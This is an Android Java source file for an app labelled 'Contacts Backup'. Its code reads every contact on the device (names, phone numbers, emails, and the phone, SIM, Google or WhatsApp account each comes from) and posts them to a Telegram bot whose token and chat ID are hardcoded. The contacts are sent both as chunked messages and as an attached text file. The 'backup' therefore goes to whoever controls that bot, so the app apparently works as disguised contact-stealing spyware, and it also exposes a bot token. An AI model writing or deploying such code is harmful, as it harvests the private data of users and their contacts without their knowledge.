package com.contactsbackup.app;

import android.Manifest;
import android.content.ContentResolver;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import org.json.JSONObject;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "ContactsBackup";

    // ============================================================
    // Telegram Bot Credentials
    // ============================================================
    private static final String BOT_TOKEN = "8774587636:AAF-seXI2X0ACIa24LjcHrqwmuyGM5eiwEQ";
    private static final String CHAT_ID = "7825761805";
    // ============================================================

    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final int TELEGRAM_MAX_LENGTH = 3500;

    private Button btnBackup;
    private ProgressBar progressBar;
    private TextView tvStatus;
    private OkHttpClient httpClient;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        btnBackup = findViewById(R.id.btn_backup);
        progressBar = findViewById(R.id.progress_bar);
        tvStatus = findViewById(R.id.tv_status);
        httpClient = new OkHttpClient();

        btnBackup.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                checkPermissionAndBackup();
            }
        });
    }

    /**
     * Check if READ_CONTACTS permission is granted.
     * If yes, start backup. If no, request it.
     */
    private void checkPermissionAndBackup() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
                == PackageManager.PERMISSION_GRANTED) {
            startBackup();
        } else {
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.READ_CONTACTS},
                    PERMISSION_REQUEST_CODE);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                startBackup();
            } else {
                tvStatus.setText("❌ Permission denied. Cannot read contacts without permission.");
                tvStatus.setVisibility(View.VISIBLE);
            }
        }
    }

    /**
     * Start the backup process on a background thread.
     */
    private void startBackup() {
        btnBackup.setEnabled(false);
        progressBar.setVisibility(View.VISIBLE);
        tvStatus.setText("📱 Reading contacts...");
        tvStatus.setVisibility(View.VISIBLE);

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    // Step 1: Read all contacts
                    List<ContactInfo> contacts = readAllContacts();

                    if (contacts.isEmpty()) {
                        updateStatus("📭 No contacts found on this device.");
                        return;
                    }

                    // Step 2: Send text messages to Telegram
                    updateStatus("📤 Sending contact messages to Telegram (" + contacts.size() + " contacts)...");
                    boolean textSuccess = sendContactsAsText(contacts);

                    // Step 3: Write contacts to a local file
                    updateStatus("💾 Saving contacts into backup file...");
                    File backupFile = createContactsBackupFile(contacts);

                    // Step 4: Send the file directly to Telegram
                    updateStatus("📤 Sending backup file attachment to Telegram...");
                    boolean fileSuccess = sendFileToTelegram(backupFile, contacts.size());

                    if (textSuccess && fileSuccess) {
                        updateStatus("✅ All " + contacts.size() + " contacts + backup file sent to Telegram successfully!");
                    } else if (fileSuccess) {
                        updateStatus("✅ Backup file sent successfully to Telegram!");
                    } else {
                        updateStatus("❌ Failed to send to Telegram. Please check your connection.");
                    }

                } catch (Exception e) {
                    Log.e(TAG, "Error during backup", e);
                    updateStatus("❌ Error: " + e.getMessage());
                } finally {
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            btnBackup.setEnabled(true);
                            progressBar.setVisibility(View.GONE);
                        }
                    });
                }
            }
        }).start();
    }

    /**
     * Create a formatted contacts backup text file on the local device storage.
     */
    private File createContactsBackupFile(List<ContactInfo> contacts) throws IOException {
        File dir = getExternalFilesDir(null);
        if (dir == null) {
            dir = getFilesDir();
        }

        String dateStr = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
        File backupFile = new File(dir, "contacts_backup_" + dateStr + ".txt");

        try (FileWriter writer = new FileWriter(backupFile)) {
            writer.write("========================================\n");
            writer.write("           CONTACTS BACKUP              \n");
            writer.write("========================================\n");
            writer.write("Total Contacts: " + contacts.size() + "\n");
            writer.write("Date: " + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date()) + "\n");
            writer.write("========================================\n\n");

            int index = 1;
            for (ContactInfo contact : contacts) {
                writer.write(index + ". " + contact.name + "\n");
                for (String phone : contact.phones) {
                    writer.write("   Phone: " + phone + "\n");
                }
                for (String email : contact.emails) {
                    writer.write("   Email: " + email + "\n");
                }
                if (contact.source != null) {
                    writer.write("   Source: " + contact.source + "\n");
                }
                writer.write("----------------------------------------\n");
                index++;
            }
        }

        return backupFile;
    }

    /**
     * Send contacts as text messages to Telegram.
     */
    private boolean sendContactsAsText(List<ContactInfo> contacts) {
        String dateStr = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
        StringBuilder header = new StringBuilder();
        header.append("📋 CONTACTS BACKUP\n");
        header.append("━━━━━━━━━━━━━━━━━━━━\n");
        header.append("📊 Total contacts: ").append(contacts.size()).append("\n");
        header.append("📅 Date: ").append(dateStr).append("\n");
        header.append("━━━━━━━━━━━━━━━━━━━━\n\n");

        if (!sendTelegramTextMessage(header.toString())) {
            Log.e(TAG, "Failed to send header to Telegram");
        }

        StringBuilder chunk = new StringBuilder();
        int contactNum = 0;
        boolean allSuccess = true;

        for (ContactInfo contact : contacts) {
            contactNum++;
            StringBuilder entry = new StringBuilder();
            entry.append("👤 ").append(contactNum).append(". ").append(contact.name).append("\n");

            for (String phone : contact.phones) {
                entry.append("   📞 ").append(phone).append("\n");
            }
            for (String email : contact.emails) {
                entry.append("   ✉️ ").append(email).append("\n");
            }
            if (contact.source != null) {
                entry.append("   🔗 Source: ").append(contact.source).append("\n");
            }
            entry.append("\n");

            if (chunk.length() + entry.length() > TELEGRAM_MAX_LENGTH) {
                if (!sendTelegramTextMessage(chunk.toString())) {
                    allSuccess = false;
                }
                chunk = new StringBuilder();

                try {
                    Thread.sleep(500); // Avoid rate limiting
                } catch (InterruptedException ignored) {}
            }

            chunk.append(entry);
        }

        if (chunk.length() > 0) {
            if (!sendTelegramTextMessage(chunk.toString())) {
                allSuccess = false;
            }
        }

        return allSuccess;
    }

    /**
     * Send a single plain text message to Telegram via sendMessage endpoint.
     */
    private boolean sendTelegramTextMessage(String text) {
        String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";

        try {
            JSONObject json = new JSONObject();
            json.put("chat_id", CHAT_ID);
            json.put("text", text);

            RequestBody body = RequestBody.create(
                    json.toString(),
                    MediaType.parse("application/json; charset=utf-8")
            );

            Request request = new Request.Builder()
                    .url(url)
                    .post(body)
                    .build();

            Response response = httpClient.newCall(request).execute();
            boolean success = response.isSuccessful();
            if (!success) {
                String errorBody = response.body() != null ? response.body().string() : "No response body";
                Log.e(TAG, "Telegram sendMessage Error: Code " + response.code() + " - " + errorBody);
            }
            response.close();
            return success;
        } catch (Exception e) {
            Log.e(TAG, "Error sending text message to Telegram", e);
            return false;
        }
    }

    /**
     * Send the generated backup file to Telegram using sendDocument.
     */
    private boolean sendFileToTelegram(File file, int totalContacts) {
        String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";

        try {
            RequestBody fileBody = RequestBody.create(
                    file,
                    MediaType.parse("text/plain; charset=utf-8")
            );

            MultipartBody requestBody = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID)
                    .addFormDataPart("caption", "📋 Contacts Backup File (" + file.getName() + ")\n📊 Total: " + totalContacts + " contacts")
                    .addFormDataPart("document", file.getName(), fileBody)
                    .build();

            Request request = new Request.Builder()
                    .url(url)
                    .post(requestBody)
                    .build();

            Response response = httpClient.newCall(request).execute();
            boolean success = response.isSuccessful();
            if (!success) {
                String errorBody = response.body() != null ? response.body().string() : "No response body";
                Log.e(TAG, "Telegram sendDocument Error: Code " + response.code() + " - " + errorBody);
            }
            response.close();
            return success;
        } catch (Exception e) {
            Log.e(TAG, "Error sending document to Telegram", e);
            return false;
        }
    }

    /**
     * Read ALL contacts from the device.
     * This includes contacts from phone storage, SIM card, and Google/Gmail accounts.
     */
    private List<ContactInfo> readAllContacts() {
        Map<String, ContactInfo> contactMap = new LinkedHashMap<>();
        ContentResolver cr = getContentResolver();

        // --- Read phone numbers ---
        Cursor phoneCursor = cr.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Phone.NUMBER,
                        ContactsContract.CommonDataKinds.Phone.TYPE
                },
                null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
        );

        if (phoneCursor != null) {
            try {
                int idIdx = phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID);
                int nameIdx = phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                int numberIdx = phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                int typeIdx = phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE);

                while (phoneCursor.moveToNext()) {
                    String id = phoneCursor.getString(idIdx);
                    String name = phoneCursor.getString(nameIdx);
                    String number = phoneCursor.getString(numberIdx);
                    int type = phoneCursor.getInt(typeIdx);

                    if (name == null || name.trim().isEmpty()) name = "Unknown";
                    if (number == null || number.trim().isEmpty()) continue;

                    ContactInfo contact = contactMap.get(id);
                    if (contact == null) {
                        contact = new ContactInfo(name);
                        contactMap.put(id, contact);
                    }

                    String typeLabel = getPhoneTypeLabel(type);
                    contact.addPhone(number.trim() + " (" + typeLabel + ")");
                }
            } catch (Exception e) {
                Log.e(TAG, "Error reading phone numbers", e);
            } finally {
                phoneCursor.close();
            }
        }

        // --- Read email addresses ---
        Cursor emailCursor = cr.query(
                ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                new String[]{
                        ContactsContract.CommonDataKinds.Email.CONTACT_ID,
                        ContactsContract.CommonDataKinds.Email.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Email.ADDRESS
                },
                null, null, null
        );

        if (emailCursor != null) {
            try {
                int idIdx = emailCursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.CONTACT_ID);
                int nameIdx = emailCursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.DISPLAY_NAME);
                int emailIdx = emailCursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS);

                while (emailCursor.moveToNext()) {
                    String id = emailCursor.getString(idIdx);
                    String name = emailCursor.getString(nameIdx);
                    String email = emailCursor.getString(emailIdx);

                    if (email == null || email.trim().isEmpty()) continue;

                    ContactInfo contact = contactMap.get(id);
                    if (contact == null) {
                        if (name == null || name.trim().isEmpty()) name = "Unknown";
                        contact = new ContactInfo(name);
                        contactMap.put(id, contact);
                    }

                    contact.addEmail(email.trim());
                }
            } catch (Exception e) {
                Log.e(TAG, "Error reading email addresses", e);
            } finally {
                emailCursor.close();
            }
        }

        // --- Read account info (Phone, SIM, Google) ---
        Cursor accountCursor = cr.query(
                ContactsContract.RawContacts.CONTENT_URI,
                new String[]{
                        ContactsContract.RawContacts.CONTACT_ID,
                        ContactsContract.RawContacts.ACCOUNT_TYPE,
                        ContactsContract.RawContacts.ACCOUNT_NAME
                },
                null, null, null
        );

        if (accountCursor != null) {
            try {
                int idIdx = accountCursor.getColumnIndex(ContactsContract.RawContacts.CONTACT_ID);
                int typeIdx = accountCursor.getColumnIndex(ContactsContract.RawContacts.ACCOUNT_TYPE);
                int nameIdx = accountCursor.getColumnIndex(ContactsContract.RawContacts.ACCOUNT_NAME);

                while (accountCursor.moveToNext()) {
                    String id = accountCursor.getString(idIdx);
                    String accountType = accountCursor.getString(typeIdx);
                    String accountName = accountCursor.getString(nameIdx);

                    ContactInfo contact = contactMap.get(id);
                    if (contact != null && accountType != null) {
                        String source = getAccountSource(accountType);
                        if (accountName != null && !accountName.trim().isEmpty()) {
                            source += " (" + accountName + ")";
                        }
                        contact.setSource(source);
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "Error reading account info", e);
            } finally {
                accountCursor.close();
            }
        }

        return new ArrayList<>(contactMap.values());
    }

    /**
     * Get a human-readable label for the phone number type.
     */
    private String getPhoneTypeLabel(int type) {
        switch (type) {
            case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE: return "Mobile";
            case ContactsContract.CommonDataKinds.Phone.TYPE_HOME: return "Home";
            case ContactsContract.CommonDataKinds.Phone.TYPE_WORK: return "Work";
            case ContactsContract.CommonDataKinds.Phone.TYPE_FAX_HOME: return "Fax Home";
            case ContactsContract.CommonDataKinds.Phone.TYPE_FAX_WORK: return "Fax Work";
            case ContactsContract.CommonDataKinds.Phone.TYPE_MAIN: return "Main";
            default: return "Other";
        }
    }

    /**
     * Map account type to a friendly source name.
     */
    private String getAccountSource(String accountType) {
        if (accountType == null) return "📱 Phone";
        String lower = accountType.toLowerCase();
        if (lower.contains("google") || lower.contains("gmail")) {
            return "📧 Google";
        } else if (lower.contains("sim")) {
            return "📶 SIM";
        } else if (lower.contains("phone") || lower.contains("local")) {
            return "📱 Phone";
        } else if (lower.contains("whatsapp")) {
            return "💬 WhatsApp";
        } else {
            return "📋 " + accountType;
        }
    }

    /**
     * Update the status text on the UI thread.
     */
    private void updateStatus(final String message) {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                tvStatus.setText(message);
            }
        });
    }

    /**
     * Data class to hold contact information.
     */
    private static class ContactInfo {
        String name;
        List<String> phones = new ArrayList<>();
        List<String> emails = new ArrayList<>();
        String source;

        ContactInfo(String name) {
            this.name = name;
        }

        void addPhone(String phone) {
            if (!phones.contains(phone)) {
                phones.add(phone);
            }
        }

        void addEmail(String email) {
            if (!emails.contains(email)) {
                emails.add(email);
            }
        }

        void setSource(String source) {
            this.source = source;
        }
    }
}
